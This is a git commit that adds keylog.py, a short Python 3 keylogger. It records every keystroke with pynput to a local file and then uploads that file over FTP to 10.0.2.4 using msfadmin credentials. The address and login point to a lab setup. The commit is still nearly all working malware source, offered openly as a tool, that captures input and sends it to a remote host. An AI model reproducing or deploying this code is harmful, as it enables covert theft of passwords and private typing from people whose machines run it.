43672351c19c367f1691e4fefbf97a6bc58e2181
dhruv-kandpal <56139983+dhruv-kandpal@users.noreply.github.com>
2020-10-18 14:40:30 +0530

    FTP Keylogger written in python3

---
+++ keylog.py
@@ -0,0 +1,30 @@
+from pynput.keyboard import Key, Listener
+import ftplib
+import logging
+
+logdir = ""
+logging.basicConfig(filename=(logdir+"klog-res.txt"),level=logging.DEBUG,format="%(asctime)s:%(message)s")
+
+def pressing_key(Key):
+	try:
+		logging.info(str(Key))
+	except AttributeError:
+		print("A special key {0} has been pressed".format(Key))
+
+def releasing_key(key):
+	if key==Key.esc:
+		return False
+
+print("\nStarted Listening...")
+
+with Listener(on_press=pressing_key, on_release=releasing_key) as listener:
+	listener.join()
+
+print("\nConnecting to FTP and sending data...")
+
+sess=ftplib.FTP("10.0.2.4","msfadmin","msfadmin")
+
+file = open("klog-res.txt","rb")
+sess.storbinary("STOR klog-res.txt",file)
+file.close()
+sess.quit()
